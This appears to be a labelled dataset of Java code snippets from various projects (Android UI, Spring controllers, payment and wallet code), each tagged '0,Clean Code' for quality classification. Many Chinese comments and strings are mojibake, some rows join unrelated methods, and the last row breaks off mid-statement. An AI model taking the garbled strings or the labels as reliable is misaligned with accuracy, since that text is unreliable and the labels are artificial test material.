@Operation(summary=""娣诲姞涓婄骇骞冲彴淇℃伅"",security=@SecurityRequirement(name=JwtUtils.HEADER)) @PostMapping(""/add"") @ResponseBody public void addPlatform(@RequestBody ParentPlatform parentPlatform){
  if (logger.isDebugEnabled()) {
    logger.debug(""淇濆瓨涓婄骇骞冲彴淇℃伅API璋冪敤"");
  }
  if (ObjectUtils.isEmpty(parentPlatform.getName()) || ObjectUtils.isEmpty(parentPlatform.getServerGBId()) || ObjectUtils.isEmpty(parentPlatform.getServerGBDomain())|| ObjectUtils.isEmpty(parentPlatform.getServerIP())|| ObjectUtils.isEmpty(parentPlatform.getServerPort())|| ObjectUtils.isEmpty(parentPlatform.getDeviceGBId())|| ObjectUtils.isEmpty(parentPlatform.getExpires())|| ObjectUtils.isEmpty(parentPlatform.getKeepTimeout())|| ObjectUtils.isEmpty(parentPlatform.getTransport())|| ObjectUtils.isEmpty(parentPlatform.getCharacterSet())) {
    throw new ControllerException(ErrorCode.ERROR400);
  }
  if (parentPlatform.getServerPort() < 0 || parentPlatform.getServerPort() > 65535) {
    throw new ControllerException(ErrorCode.ERROR400.getCode(),""error severPort"");
  }
  ParentPlatform parentPlatformOld=storager.queryParentPlatByServerGBId(parentPlatform.getServerGBId());
  if (parentPlatformOld != null) {
    throw new ControllerException(ErrorCode.ERROR100.getCode(),""骞冲彴 "" + parentPlatform.getServerGBId() + "" 宸插瓨鍦�"");
  }
  parentPlatform.setCreateTime(DateUtil.getNow());
  parentPlatform.setUpdateTime(DateUtil.getNow());
  boolean updateResult=platformService.add(parentPlatform);
  if (!updateResult) {
    throw new ControllerException(ErrorCode.ERROR100.getCode(),""鍐欏叆鏁版嵁搴撳け璐�"");
  }
}",0,Clean Code
"@EventHandler(priority=EventPriority.HIGHEST) private void onMouseButtonBinding(MouseButtonEvent event){
  if (event.action == KeyAction.Press && widget != null && widget.onAction(false,event.button,0))   event.cancel();
}",0,Clean Code
"private void onSwitchEditModeStart(int fromMode,int toMode){
  if (toMode == EDIT_MODE_NONE) {
    backButton.setVisibility(View.VISIBLE);
    captionContainer.setVisibility(View.VISIBLE);
    if (paintView != null) {
      paintView.clearSelection();
    }
    downloadButton.setVisibility(View.VISIBLE);
    if (outputEntry != null && outputEntry.isRepostMessage) {
      getThemeButton().setVisibility(View.VISIBLE);
      updateThemeButtonDrawable(false);
    }
 else     if (themeButton != null) {
      themeButton.setVisibility(View.GONE);
    }
    titleTextView.setVisibility(View.VISIBLE);
    if (isVideo) {
      muteButton.setVisibility(View.VISIBLE);
      playButton.setVisibility(View.VISIBLE);
    }
 else     if (outputEntry != null && !TextUtils.isEmpty(outputEntry.audioPath)) {
      muteButton.setVisibility(View.GONE);
      playButton.setVisibility(View.VISIBLE);
    }
    timelineView.setVisibility(View.VISIBLE);
  }
  if (toMode == EDIT_MODE_PAINT && paintView != null) {
    paintView.setVisibility(View.VISIBLE);
  }
  if ((toMode == EDIT_MODE_PAINT || fromMode == EDIT_MODE_PAINT) && paintView != null) {
    paintView.onAnimationStateChanged(true);
  }
  if (paintView != null) {
    paintView.keyboardNotifier.ignore(toMode != EDIT_MODE_PAINT);
  }
  captionEdit.keyboardNotifier.ignore(toMode != EDIT_MODE_NONE);
  Bulletin.hideVisible();
  if (photoFilterView != null && fromMode == EDIT_MODE_FILTER) {
    applyFilter(null);
  }
  if (photoFilterEnhanceView != null) {
    photoFilterEnhanceView.setAllowTouch(false);
  }
  muteHint.hide();
}
",0,Clean Code
"public void setFocused(boolean focused){
  if (this.focused && !focused && actionOnUnfocused != null)   actionOnUnfocused.run();
  boolean wasJustFocused=focused && !this.focused;
  this.focused=focused;
  resetSelection();
  if (wasJustFocused)   onCursorChanged();
}
",0,Clean Code
"@Override protected PayRefundRespDTO doGetRefund(String outTradeNo,String outRefundNo){
  if (refundService == null) {
    refundService=SpringUtil.getBean(PayRefundService.class);
  }
  PayRefundDO payRefund=refundService.getRefundByNo(outRefundNo);
  if (payRefund == null) {
    return PayRefundRespDTO.failureOf(String.valueOf(REFUND_NOT_FOUND),REFUND_NOT_FOUND.getMsg(),outRefundNo,"""");
  }
  if (PayRefundStatusRespEnum.isFailure(payRefund.getStatus())) {
    return PayRefundRespDTO.failureOf(payRefund.getChannelErrorCode(),payRefund.getChannelErrorMsg(),outRefundNo,"""");
  }
  if (PayRefundStatusRespEnum.isSuccess(payRefund.getStatus())) {
    PayWalletTransactionDO walletTransaction=walletTransactionService.getWalletTransaction(String.valueOf(payRefund.getId()),PayWalletBizTypeEnum.PAYMENT_REFUND);
    Assert.notNull(walletTransaction,""鏀粯閫�娆惧崟 {} 閽卞寘娴佹按涓嶈兘涓虹┖"",outRefundNo);
    return PayRefundRespDTO.successOf(walletTransaction.getNo(),walletTransaction.getCreateTime(),outRefundNo,walletTransaction);
  }
  log.error(""[doGetRefund] 鏀粯閫�娆惧崟 {} 鐨勭姸鎬佷笉姝ｇ‘"",outRefundNo);
  throw new IllegalStateException(String.format(""鏀粯閫�娆惧崟[%s] 鐘舵�佷笉姝ｇ‘"",outRefundNo));
}
",0,Clean Code
"public static boolean checkDexSum(byte[] origin,PrintStream out){
  if (origin.length < 52) {
    out.println(""E Invalid dex file: truncated header"");
    return false;
  }
  if (origin[0] != 'd' || origin[1] != 'e' || origin[2] != 'x') {
    out.println(""E Invalid dex file: bad magic"");
    return false;
  }
  if (origin[4] != '0' || origin[5] != '3' || origin[6] != '5') {
    out.println(""E Unsupported dex version: "" + new String(origin,4,3) + "", only dex035 is supported."");
    return false;
  }
  int a32_dex=readLe32(origin,8);
  byte[] sha1sig_dex=subByteArray(origin,12,20);
  int size=readLe32(origin,32);
  if (size != origin.length) {
    out.printf(""E Corrupted dex file: expected %d bytes, %d got\n"",size,origin.length);
    return false;
  }
  out.printf(""I Dex size is 0x%x(%d)\n"",size,size);
  MessageDigest md;
  try {
    md=MessageDigest.getInstance(""SHA-1"");
  }
 catch (  NoSuchAlgorithmException ex) {
    throw new RuntimeException(ex);
  }
  md.update(origin,32,origin.length - 32);
  byte[] signature=md.digest();
  if (signature.length != kSHA1DigestLen) {
    throw new RuntimeException(""unexpected digest write: "" + signature.length + "" bytes"");
  }
  Adler32 adler32=new Adler32();
  adler32.update(origin,12,origin.length - 12);
  int a32=(int)adler32.getValue();
  boolean ret=true;
  if (a32 == a32_dex) {
    out.printf(""I Dex Adler32 checksum: %08x\n"",a32_dex);
  }
 else {
    out.printf(""E Incorrect Adler32 checksum: %08x, expected %08x\n"",a32_dex,a32);
    ret=false;
  }
  if (bytesEqu(sha1sig_dex,signature)) {
    out.println(""I SHA1 sig: "" + HexUtils.byteArrayToString(sha1sig_dex));
  }
 else {
    out.println(""E Incorrect SHA1 sig: "" + HexUtils.byteArrayToString(sha1sig_dex) + "", expected ""+ HexUtils.byteArrayToString(signature));
    ret=false;
  }
  return ret;
}",0,Clean Code
"private void onTouchUp(){
  if (!recognizedLongPress && !hasPanned && !hasTransformed&& !announcedSelection&& delegate != null) {
    delegate.onEntitySelected(this);
  }
  recognizedLongPress=false;
  hasPanned=false;
  hasTransformed=false;
  hasReleased=true;
  announcedSelection=false;
  if (getParent() instanceof EntitiesContainerView) {
    ((EntitiesContainerView)getParent()).invalidate();
  }
}
",0,Clean Code
"/** 
 * Asserts that the media source reported completed loads via  {@link MediaSourceEventListener#onLoadCompleted(int,MediaPeriodId,LoadEventInfo,MediaLoadData)} foreach specified media period id, and asserts that the associated window index matches the one in the last known timeline returned from  {@link #prepareSource()},  {@link #assertTimelineChange()}or  {@link #assertTimelineChangeBlocking()}.
 */
public void assertCompletedMediaPeriodLoads(MediaPeriodId... mediaPeriodIds){
  Timeline.Period period=new Timeline.Period();
  HashSet<MediaPeriodId> expectedLoads=new HashSet<>(Arrays.asList(mediaPeriodIds));
  for (  Pair<Integer,MediaPeriodId> windowIndexAndMediaPeriodId : completedLoads) {
    int windowIndex=windowIndexAndMediaPeriodId.first;
    MediaPeriodId mediaPeriodId=windowIndexAndMediaPeriodId.second;
    if (expectedLoads.remove(mediaPeriodId)) {
      int periodIndex=timeline.getIndexOfPeriod(mediaPeriodId.periodUid);
      assertThat(windowIndex).isEqualTo(timeline.getPeriod(periodIndex,period).windowIndex);
    }
  }
  assertWithMessage(""Not all expected media source loads have been completed."").that(expectedLoads).isEmpty();
}
",0,Clean Code
"@Override protected void onDraw(Canvas canvas){
  super.onDraw(canvas);
  if (checkBoxType == 2 && (isChecked || checkProgress > 0.0f)) {
    paint.setColor(Theme.getColor(Theme.key_checkboxSquareBackground));
    float cx=avatarImageView.getLeft() + avatarImageView.getMeasuredWidth() / 2;
    float cy=avatarImageView.getTop() + avatarImageView.getMeasuredHeight() / 2;
    canvas.drawCircle(cx,cy,AndroidUtilities.dp(18) + AndroidUtilities.dp(4) * checkProgress,paint);
  }
  if (drawDivider) {
    int start=AndroidUtilities.dp(LocaleController.isRTL ? 0 : 72 + padding);
    int end=getMeasuredWidth() - AndroidUtilities.dp(!LocaleController.isRTL ? 0 : 72 + padding);
    if (forceDarkTheme) {
      Theme.dividerExtraPaint.setColor(Theme.getColor(Theme.key_voipgroup_actionBar));
      canvas.drawRect(start,getMeasuredHeight() - 1,end,getMeasuredHeight(),Theme.dividerExtraPaint);
    }
 else {
      canvas.drawRect(start,getMeasuredHeight() - 1,end,getMeasuredHeight(),Theme.dividerPaint);
    }
  }
}",0,Clean Code
"private void responseDescribe(byte[] body,CharSequence contentType,int statusCode,String statusPhrase,Map<String,String> responseHeaders){
  try {
    ArrayList<DescribeModelResponse> respList=ApiUtils.getModelDescription(this.getModelName(),this.getModelVersion());
    if ((body != null && body.length != 0) && respList != null && respList.size() == 1) {
      respList.get(0).setCustomizedMetadata(body);
    }
    HttpResponseStatus status=(statusPhrase == null) ? HttpResponseStatus.valueOf(statusCode) : new HttpResponseStatus(statusCode,statusPhrase);
    FullHttpResponse resp=new DefaultFullHttpResponse(HttpVersion.HTTP_1_1,status,true);
    if (contentType != null && contentType.length() > 0) {
      resp.headers().set(HttpHeaderNames.CONTENT_TYPE,contentType);
    }
 else {
      resp.headers().set(HttpHeaderNames.CONTENT_TYPE,HttpHeaderValues.APPLICATION_JSON);
    }
    if (responseHeaders != null) {
      for (      Map.Entry<String,String> e : responseHeaders.entrySet()) {
        resp.headers().set(e.getKey(),e.getValue());
      }
    }
    ByteBuf content=resp.content();
    content.writeCharSequence(JsonUtils.GSON_PRETTY.toJson(respList),CharsetUtil.UTF_8);
    content.writeByte('\n');
    NettyUtils.sendHttpResponse(ctx,resp,true);
  }
 catch (  ModelNotFoundException|ModelVersionNotFoundException e) {
    logger.trace("""",e);
    NettyUtils.sendError(ctx,HttpResponseStatus.NOT_FOUND,e);
  }
}",0,Clean Code
"@Override public String toString(){
  return Bytes.toString(bytes,0,bytes.length);
}
/** 
 * Write a printable representation of a byte array. Non-printable characters are hex escaped in the format \\x%02X, eg: \x00 \x05 etc. This function is brought from org.apache.hadoop.hbase.util.Bytes
 * @param b array to write out
 * @param off offset to start at
 * @param len length to write
 * @return string output
 */
@SuppressWarnings(""SameParameterValue"") private static String toString(final byte[] b,int off,int len){
  final StringBuilder result=new StringBuilder();
  if (b == null) {
    return result.toString();
  }
  if (off >= b.length) {
    return result.toString();
  }
  if (off + len > b.length) {
    len=b.length - off;
  }
  for (int i=off; i < off + len; ++i) {
    final int ch=b[i] & 0xFF;
    if (ch >= ' ' && ch <= '~' && ch != '\\') {
      result.append((char)ch);
    }
 else {
      result.append(""\\x"");
      result.append(HEX_CHARS_UPPER[ch / 0x10]);
      result.append(HEX_CHARS_UPPER[ch % 0x10]);
    }
  }
  return result.toString();
}",0,Clean Code
"private Map<String,FieldSchema> buildFields(Schema schema){
  Map<String,FieldSchema> fieldSchemaMap=new LinkedHashMap<>();
  List<String> columnNameList=schema.getColumnNames();
  for (  String columnName : columnNameList) {
    Column column=schema.getColumn(columnName).get();
    String typeString;
    if (column.getType() instanceof LocalZonedTimestampType || column.getType() instanceof TimestampType || column.getType() instanceof ZonedTimestampType) {
      int precision=DataTypeChecks.getPrecision(column.getType());
      typeString=String.format(""%s(%s)"",""DATETIMEV2"",Math.min(Math.max(precision,0),6));
    }
 else {
      typeString=DorisTypeMapper.toDorisType(DataTypeUtils.toFlinkDataType(column.getType()));
    }
    fieldSchemaMap.put(column.getName(),new FieldSchema(column.getName(),typeString,column.getComment()));
  }
  return fieldSchemaMap;
}",0,Clean Code
"@Override public void onScrolled(@NonNull RecyclerView recyclerView,int dx,int dy){
  onScroll();
  invalidate();
}
@Override public void onScrolled(@NonNull RecyclerView recyclerView,int dx,int dy){
  if (searchListView.scrollingByUser && searchItem != null && searchItem.getSearchField() != null) {
    AndroidUtilities.hideKeyboard(searchItem.getSearchContainer());
  }
}
",0,Clean Code
"/** 
 * Handle UI delegate classes if running in special application where multiple class loaders are involved. E.g. in Eclipse plugin or in LibreOffice extension. <p> Problem: Swing runs in Java's system classloader and FlatLaf is loaded in plugin classloader. When Swing tries to load UI delegate class in  {@link UIDefaults#getUIClass(String,ClassLoader)}, invoked from  {@link UIDefaults#getUI(JComponent)}, it uses the component's classloader, which is Java's system classloader for core Swing components, and can not find FlatLaf UI delegates. <p> Solution: Add lazy values for UI delegate class names. Those lazy values use FlatLaf classloader to load UI delegate class. This is similar to what  {@link UIDefaults#getUIClass(String,ClassLoader)} does.<p> Not using  {@code defaults.put( ""ClassLoader"", FlatLaf.class.getClassLoader() )}, which would work for FlatLaf UI delegates, but it would break custom UI delegates used in other classloaders.
 */
private static void addLazyUIdelegateClassLoading(UIDefaults defaults){
  if (FlatLaf.class.getClassLoader() == ClassLoader.getSystemClassLoader())   return;
  Map<String,LazyValue> map=new HashMap<>();
  for (  Map.Entry<Object,Object> e : defaults.entrySet()) {
    Object key=e.getKey();
    Object value=e.getValue();
    if (key instanceof String && ((String)key).endsWith(""UI"") && value instanceof String&& !defaults.containsKey(value)) {
      String className=(String)value;
      map.put(className,(LazyValue)t -> {
        try {
          Class<?> uiClass=FlatLaf.class.getClassLoader().loadClass(className);
          if (ComponentUI.class.isAssignableFrom(uiClass))           return uiClass;
        }
 catch (        ClassNotFoundException ex) {
        }
        return null;
      }
);
    }
  }
  defaults.putAll(map);
}
",0,Clean Code
"/** 
 * 杞崲涓哄瓧绗�<br> 濡傛灉缁欏畾鐨勫�间负null锛屾垨鑰呰浆鎹㈠け璐ワ紝杩斿洖榛樿鍊�<br> 杞崲澶辫触涓嶄細鎶ラ敊
 * @param value        琚浆鎹㈢殑鍊�
 * @param defaultValue 杞崲閿欒鏃剁殑榛樿鍊�
 * @return 缁撴灉
 */
public static Character toChar(Object value,Character defaultValue){
  if (null == value) {
    return defaultValue;
  }
  if (value instanceof Character) {
    return (Character)value;
  }
  final String valueStr=toStr(value,null);
  return StringUtils.isEmpty(valueStr) ? defaultValue : valueStr.charAt(0);
}
/** 
 * 杞崲涓哄瓧绗�<br> 濡傛灉缁欏畾鐨勫�间负<code>null</code>锛屾垨鑰呰浆鎹㈠け璐ワ紝杩斿洖榛樿鍊�<code>null</code><br> 杞崲澶辫触涓嶄細鎶ラ敊
 * @param value 琚浆鎹㈢殑鍊�
 * @return 缁撴灉
 */
public static Character toChar(Object value){
  return toChar(value,null);
}",0,Clean Code
"private void addAndSaveAccount(Wallet masterWallet,StandardAccount standardAccount,Key key){
  List<Wallet> childWallets;
  if (standardAccount == StandardAccount.WHIRLPOOL_PREMIX) {
    childWallets=AppServices.addWhirlpoolWallets(masterWallet,getWalletForm().getWalletId(),getWalletForm().getStorage());
  }
 else {
    Wallet childWallet=masterWallet.addChildWallet(standardAccount);
    EventManager.get().post(new ChildWalletsAddedEvent(getWalletForm().getStorage(),masterWallet,childWallet));
    childWallets=List.of(childWallet);
  }
  if (key != null) {
    for (    Wallet childWallet : childWallets) {
      childWallet.encrypt(key);
    }
  }
  saveChildWallets(masterWallet);
}
",0,Clean Code
"public int layout(final SuggestedWords suggestedWords,final int fromIndex,final int maxWidth,final int minWidth,final int maxRow,final Paint paint,final Context context){
  clearKeys();
  mDivider=ContextCompat.getDrawable(context,R.drawable.more_suggestions_divider);
  mDividerWidth=mDivider == null ? 0 : mDivider.getIntrinsicWidth();
  final float padding=context.getResources().getDimension(R.dimen.config_more_suggestions_key_horizontal_padding);
  int row=0;
  int index=fromIndex;
  int rowStartIndex=fromIndex;
  final int size=Math.min(suggestedWords.size(),SuggestedWords.MAX_SUGGESTIONS);
  while (index < size) {
    final String word;
    if (isIndexSubjectToAutoCorrection(suggestedWords,index)) {
      word=suggestedWords.getLabel(SuggestedWords.INDEX_OF_TYPED_WORD);
    }
 else {
      word=suggestedWords.getLabel(index);
    }
    mWidths[index]=(int)(TypefaceUtils.getStringWidth(word,paint) + padding);
    final int numColumn=index - rowStartIndex + 1;
    final int columnWidth=(maxWidth - mDividerWidth * (numColumn - 1)) / numColumn;
    if (numColumn > MAX_COLUMNS_IN_ROW || !fitInWidth(rowStartIndex,index + 1,columnWidth)) {
      if ((row + 1) >= maxRow) {
        break;
      }
      mNumColumnsInRow[row]=index - rowStartIndex;
      rowStartIndex=index;
      row++;
    }
    mColumnOrders[index]=index - rowStartIndex;
    mRowNumbers[index]=row;
    index++;
  }
  mNumColumnsInRow[row]=index - rowStartIndex;
  mNumRows=row + 1;
  mBaseWidth=mOccupiedWidth=Math.max(minWidth,calcurateMaxRowWidth(fromIndex,index));
  mBaseHeight=mOccupiedHeight=mNumRows * mDefaultAbsoluteRowHeight + mVerticalGap;
  return index - fromIndex;
}",0,Clean Code
"/** 
 * 缁勮 鎷夊彇鍥炴墽淇℃伅
 * @param account
 * @param resp
 * @return
 */
private List<SmsRecord> assemblePullSmsRecord(TencentSmsAccount account,PullSmsSendStatusResponse resp){
  List<SmsRecord> smsRecordList=new ArrayList<>();
  if (Objects.nonNull(resp) && Objects.nonNull(resp.getPullSmsSendStatusSet()) && resp.getPullSmsSendStatusSet().length > 0) {
    for (    PullSmsSendStatus pullSmsSendStatus : resp.getPullSmsSendStatusSet()) {
      SmsRecord smsRecord=SmsRecord.builder().sendDate(Integer.valueOf(DateUtil.format(new Date(),DatePattern.PURE_DATE_PATTERN))).messageTemplateId(0L).phone(Long.valueOf(pullSmsSendStatus.getSubscriberNumber())).supplierId(account.getSupplierId()).supplierName(account.getSupplierName()).msgContent("""").seriesId(pullSmsSendStatus.getSerialNo()).chargingNum(0).status(""SUCCESS"".equals(pullSmsSendStatus.getReportStatus()) ? SmsStatus.RECEIVE_SUCCESS.getCode() : SmsStatus.RECEIVE_FAIL.getCode()).reportContent(pullSmsSendStatus.getDescription()).updated(Math.toIntExact(pullSmsSendStatus.getUserReceiveTime())).created(Math.toIntExact(DateUtil.currentSeconds())).build();
      smsRecordList.add(smsRecord);
    }
  }
  return smsRecordList;
}",0,Clean Code
"@Override public void moveRelative(double relX,double relY,double relZ,float yaw,float pitch,float headYaw,boolean isOnGround){
  setYaw(yaw);
  setPitch(pitch);
  setHeadYaw(headYaw);
  this.position=Vector3f.from(position.getX() + relX,position.getY() + relY,position.getZ() + relZ);
  setOnGround(isOnGround);
  MovePlayerPacket movePlayerPacket=new MovePlayerPacket();
  movePlayerPacket.setRuntimeEntityId(geyserId);
  movePlayerPacket.setPosition(position);
  movePlayerPacket.setRotation(getBedrockRotation());
  movePlayerPacket.setOnGround(isOnGround);
  movePlayerPacket.setMode(MovePlayerPacket.Mode.NORMAL);
  if (getFlag(EntityFlag.SLEEPING)) {
    if (bedPosition != null && (bedPosition.getY() == 0 || bedPosition.distanceSquared(position.toInt()) > 4)) {
      movePlayerPacket.setPosition(Vector3f.from(position.getX(),position.getY() - definition.offset() + 0.2f,position.getZ()));
      movePlayerPacket.setMode(MovePlayerPacket.Mode.TELEPORT);
      movePlayerPacket.setTeleportationCause(MovePlayerPacket.TeleportationCause.UNKNOWN);
    }
  }
  session.sendUpstreamPacket(movePlayerPacket);
  if (leftParrot != null) {
    leftParrot.moveRelative(relX,relY,relZ,yaw,pitch,headYaw,true);
  }
  if (rightParrot != null) {
    rightParrot.moveRelative(relX,relY,relZ,yaw,pitch,headYaw,true);
  }
}",0,Clean Code
"public boolean next(){
  if (step1.isVisible()) {
    step1.setVisible(false);
    step2.setVisible(true);
    welcomeBox.getStyleClass().clear();
    welcomeBox.getStyleClass().add(""public-electrum"");
    PauseTransition wait=new PauseTransition(Duration.millis(200));
    wait.setOnFinished((e) -> {
      serverToggle.setSelected(true);
      serverStatus.setText(""Connected to a Public Server (demonstration only)"");
    }
);
    wait.play();
    return true;
  }
  if (step2.isVisible()) {
    step2.setVisible(false);
    step3.setVisible(true);
    welcomeBox.getStyleClass().clear();
    welcomeBox.getStyleClass().add(""bitcoin-core"");
    serverToggle.setSelected(true);
    serverStatus.setText(""Connected to Bitcoin Core (demonstration only)"");
    return true;
  }
  if (step3.isVisible()) {
    step3.setVisible(false);
    step4.setVisible(true);
    welcomeBox.getStyleClass().clear();
    welcomeBox.getStyleClass().add(""private-electrum"");
    serverToggle.setSelected(true);
    serverStatus.setText(""Connected to a Private Electrum Server (demonstration only)"");
  }
  return false;
}",0,Clean Code
"/** 
 * Returns a request builder with Authorization header set if the provided repository specifies credentials
 */
private HttpSender.Request.Builder applyAuthenticationToRequest(MavenRepository repository,HttpSender.Request.Builder request){
  if (ctx.getSettings() != null && ctx.getSettings().getServers() != null) {
    for (    MavenSettings.Server server : ctx.getSettings().getServers().getServers()) {
      if (server.getId().equals(repository.getId()) && server.getConfiguration() != null && server.getConfiguration().getHttpHeaders() != null) {
        for (        MavenSettings.HttpHeader header : server.getConfiguration().getHttpHeaders()) {
          request.withHeader(header.getName(),header.getValue());
        }
      }
    }
  }
  if (hasCredentials(repository)) {
    return request.withBasicAuthentication(repository.getUsername(),repository.getPassword());
  }
  return request;
}
",0,Clean Code
"/** 
 * 鑷姩鏍规嵁浜嬩欢娉ㄥ唽 Instance 瀹炰緥
 * @param event 浜嬩欢
 */
@Override public void onApplicationEvent(WorkflowTaskStateActionLoadedEvent event){
  String key=event.getKey();
  Object bean;
  try {
    bean=context.getBean(event.getBeanName());
  }
 catch (  Exception e) {
    String message=String.format(""cannot get bean now, failed to load action instance|beanName=%s|key=%s"",event.getBeanName(),event.getKey());
    log.error(message);
    throw new AppException(AppErrorCode.UNKNOWN_ERROR,message);
  }
  register(key,(WorkflowTaskStateAction)bean);
  log.info(""workflow task state action {} has registered"",key);
}
",0,Clean Code
"private String encrypt(String plain,String password) throws NoSuchAlgorithmException {
  if (plain == null) {
    return null;
  }
  byte[] plainBytes=plain.getBytes(StandardCharsets.UTF_8);
  KeyDeriver keyDeriver=new DoubleSha256KeyDeriver();
  Key key=keyDeriver.deriveKey(password);
  KeyCrypter keyCrypter=new AESKeyCrypter();
  byte[] initializationVector=new byte[16];
  SecureRandom.getInstanceStrong().nextBytes(initializationVector);
  EncryptedData encryptedData=keyCrypter.encrypt(plainBytes,initializationVector,key);
  byte[] encrypted=new byte[initializationVector.length + encryptedData.getEncryptedBytes().length];
  System.arraycopy(initializationVector,0,encrypted,0,16);
  System.arraycopy(encryptedData.getEncryptedBytes(),0,encrypted,16,encryptedData.getEncryptedBytes().length);
  byte[] encryptedBase64=Base64.getEncoder().encode(encrypted);
  return new String(encryptedBase64,StandardCharsets.UTF_8);
}",0,Clean Code
"void onExecuteEntranceTransition(){
  final View view=getView();
  if (view == null) {
    return;
  }
  view.getViewTreeObserver().addOnPreDrawListener(new ViewTreeObserver.OnPreDrawListener(){
    @Override public boolean onPreDraw(){
      view.getViewTreeObserver().removeOnPreDrawListener(this);
      if (getContext() == null || getView() == null) {
        return true;
      }
      internalCreateEntranceTransition();
      onEntranceTransitionStart();
      if (mEntranceTransition != null) {
        runEntranceTransition(mEntranceTransition);
      }
 else {
        mStateMachine.fireEvent(EVT_ENTRANCE_END);
      }
      return false;
    }
  }
);
  view.invalidate();
}
",0,Clean Code
"@Transactional(rollbackFor=Exception.class) @Override public void deletion(UserDeletionReqDTO requestParam){
  String username=UserContext.getUsername();
  if (!Objects.equals(username,requestParam.getUsername())) {
    throw new ClientException(""娉ㄩ攢璐﹀彿涓庣櫥褰曡处鍙蜂笉涓�鑷�"");
  }
  RLock lock=redissonClient.getLock(USER_DELETION + requestParam.getUsername());
  lock.lock();
  try {
    UserQueryRespDTO userQueryRespDTO=userService.queryUserByUsername(username);
    UserDeletionDO userDeletionDO=UserDeletionDO.builder().idType(userQueryRespDTO.getIdType()).idCard(userQueryRespDTO.getIdCard()).build();
    userDeletionMapper.insert(userDeletionDO);
    UserDO userDO=new UserDO();
    userDO.setDeletionTime(System.currentTimeMillis());
    userDO.setUsername(username);
    userMapper.deletionUser(userDO);
    UserPhoneDO userPhoneDO=UserPhoneDO.builder().phone(userQueryRespDTO.getPhone()).deletionTime(System.currentTimeMillis()).build();
    userPhoneMapper.deletionUser(userPhoneDO);
    if (StrUtil.isNotBlank(userQueryRespDTO.getMail())) {
      UserMailDO userMailDO=UserMailDO.builder().mail(userQueryRespDTO.getMail()).deletionTime(System.currentTimeMillis()).build();
      userMailMapper.deletionUser(userMailDO);
    }
    distributedCache.delete(UserContext.getToken());
    userReuseMapper.insert(new UserReuseDO(username));
    StringRedisTemplate instance=(StringRedisTemplate)distributedCache.getInstance();
    instance.opsForSet().add(USER_REGISTER_REUSE_SHARDING + hashShardingIdx(username),username);
  }
  finally {
    lock.unlock();
  }
}
",0,Clean Code
"@Override public TrackOutput track(int id,int type){
  @Nullable TrackOutput trackOutput=null;
  if (MAPPABLE_TYPES.contains(type)) {
    trackOutput=getMappedTrackOutput(id,type);
  }
 else {
    for (int i=0; i < sampleQueues.length; i++) {
      if (sampleQueueTrackIds[i] == id) {
        trackOutput=sampleQueues[i];
        break;
      }
    }
  }
  if (trackOutput == null) {
    if (tracksEnded) {
      return createDummyTrackOutput(id,type);
    }
 else {
      trackOutput=createSampleQueue(id,type);
    }
  }
  if (type == C.TRACK_TYPE_METADATA) {
    if (emsgUnwrappingTrackOutput == null) {
      emsgUnwrappingTrackOutput=new EmsgUnwrappingTrackOutput(trackOutput,metadataType);
    }
    return emsgUnwrappingTrackOutput;
  }
  return trackOutput;
}",0,Clean Code
"private void init(){
  CommonConstant.INDEX_HEAD_NAMES=new String[]{I18nUtils.getMessage(""main.indexName""),I18nUtils.getMessage(""main.indexFieldName""),I18nUtils.getMessage(""main.indexType""),I18nUtils.getMessage(""main.indexMethod""),I18nUtils.getMessage(""main.indexNote"")};
  CommonConstant.COLUMN_HEAD_NAMES=new String[]{I18nUtils.getMessage(""main.fieldNo""),I18nUtils.getMessage(""main.fieldName""),I18nUtils.getMessage(""main.fieldType""),I18nUtils.getMessage(""main.fieldLength""),I18nUtils.getMessage(""main.fieldIfEmpty""),I18nUtils.getMessage(""main.fieldDefault""),I18nUtils.getMessage(""main.fieldDecimalPlaces""),I18nUtils.getMessage(""main.fieldNote"")};
  StringBuilder mdIndex=new StringBuilder(PatternConstant.MD_SPLIT);
  StringBuilder htmlIndex=new StringBuilder(""<tr><th>"");
  for (int i=0; i < CommonConstant.INDEX_HEAD_NAMES.length; i++) {
    mdIndex.append(CommonConstant.INDEX_HEAD_NAMES[i]).append(i == CommonConstant.INDEX_HEAD_NAMES.length - 1 ? """" : PatternConstant.MD_SPLIT);
    htmlIndex.append(CommonConstant.INDEX_HEAD_NAMES[i]).append(i == CommonConstant.INDEX_HEAD_NAMES.length - 1 ? """" : ""</th><th>"");
  }
  mdIndex.append(PatternConstant.MD_SPLIT);
  htmlIndex.append(""</th></tr>"");
  StringBuilder mdColumn=new StringBuilder(PatternConstant.MD_SPLIT);
  StringBuilder htmlColumn=new StringBuilder(""<tr><th>"");
  for (int i=0; i < CommonConstant.COLUMN_HEAD_NAMES.length; i++) {
    mdColumn.append(CommonConstant.COLUMN_HEAD_NAMES[i]).append(i == CommonConstant.COLUMN_HEAD_NAMES.length - 1 ? """" : PatternConstant.MD_SPLIT);
    htmlColumn.append(CommonConstant.COLUMN_HEAD_NAMES[i]).append(i == CommonConstant.COLUMN_HEAD_NAMES.length - 1 ? """" : ""</th><th>"");
  }
  mdColumn.append(PatternConstant.MD_SPLIT);
  htmlColumn.append(""</th></tr>"");
  PatternConstant.ALL_INDEX_TABLE_HEADER=mdIndex.toString();
  PatternConstant.HTML_INDEX_TABLE_HEADER=htmlIndex.toString();
  PatternConstant.ALL_TABLE_HEADER=mdColumn.toString();
  PatternConstant.HTML_TABLE_HEADER=htmlColumn.toString();
  listMap.clear();
  indexMap.clear();
}",0,Clean Code
"/** 
 * Retrieves list of all locales supported by Datafaker
 * @return a List of Strings with the name of the locale (eg. ""es"", ""es-MX"")
 */
@Deterministic public List<String> allSupportedLocales(){
  return allSupportedLocales(Set.of(""datafaker""));
}
public List<String> allSupportedLocales(Set<String> fileMasks){
  Set<String> langs=Set.of(Locale.getISOLanguages());
  String[] paths=ManagementFactory.getRuntimeMXBean().getClassPath().split(File.pathSeparator);
  Set<String> locales=new HashSet<>();
  final SimpleFileVisitor<Path> simpleFileVisitor=new SimpleFileVisitor<>(){
    @Override public FileVisitResult visitFile(    Path file,    BasicFileAttributes attrs) throws IOException {
      if (file.getNameCount() > 2) {
        return super.visitFile(file,attrs);
      }
      addLocaleIfPresent(file,langs,locales);
      return super.visitFile(file,attrs);
    }
  }
;
  final SimpleFileVisitor<Path> visitor=new SimpleFileVisitor<>(){
    @Override public FileVisitResult visitFile(    Path file,    BasicFileAttributes attrs) throws IOException {
      final String filename=file.getFileName().toString().toLowerCase(Locale.ROOT);
      if (addLocaleIfPresent(file,langs,locales)) {
      }
 else       if (filename.endsWith("".jar"") && fileMasks.stream().anyMatch(filename::contains) && Files.isRegularFile(file)&& Files.isReadable(file)) {
